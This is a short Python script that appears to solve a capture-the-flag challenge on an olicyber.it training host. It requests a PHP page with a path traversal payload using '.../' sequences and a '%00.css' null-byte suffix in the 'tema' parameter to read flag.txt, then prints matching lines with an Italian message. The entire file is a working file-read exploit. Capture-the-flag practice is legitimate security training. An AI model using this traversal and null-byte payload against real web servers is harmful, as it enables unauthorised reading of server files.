import requests
from bs4 import BeautifulSoup

url = 'http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css'

r = requests.get(url)
soup = BeautifulSoup(r.text,'html.parser')
lines_with_flag = [str(tag) for tag in soup.find_all(string=lambda t: 'flag' in t.lower())]

if lines_with_flag:
    print("Righe trovate che contengono 'flag':")
    for line in lines_with_flag:
        print(line)